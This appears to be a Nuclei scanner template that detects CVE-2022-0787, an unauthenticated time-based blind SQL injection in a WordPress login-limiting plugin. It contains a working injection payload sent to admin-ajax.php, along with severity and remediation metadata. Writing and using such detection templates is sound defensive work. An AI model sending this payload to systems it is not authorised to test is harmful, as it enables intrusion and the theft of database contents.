http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(header, "text/html")
    - contains(body, 'iTotalDisplayRecords')
    type: dsl
  raw:
  - '@timeout: 15s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)

    '
id: CVE-2022-0787
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:limit_login_attempts_project:limit_login_attempts:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0787
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.9756
    epss-score: 0.47173
  description: 'The Limit Login Attempts (Spam Protection) WordPress plugin before
    5.1 does not sanitise and escape some parameters before using them in SQL statements
    via AJAX actions (available to unauthenticated users), leading to SQL Injections.

    '
  impact: 'Unauthenticated attackers can execute time-based blind SQL injection via
    AJAX actions to extract database contents, potentially exposing WordPress user
    credentials and login attempt data.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: limit_login_attempts
    vendor: limit_login_attempts_project
    verified: true
  name: Limit Login Attempts (Spam Protection) < 5.1 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/69329a8a-2cbe-4f99-a367-b152bd85b3dd
  - https://wordpress.org/plugins/wp-limit-failed-login-attempts/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0787
  - https://github.com/cyllective/CVEs
  remediation: Fixed in version 5.1
  severity: critical
  tags: time-based-sqli,cve,cve2022,wpscan,sqli,wordpress,wp-plugin,wp,wp-limit-failed-login-attempts,limit_login_attempts_project,vuln
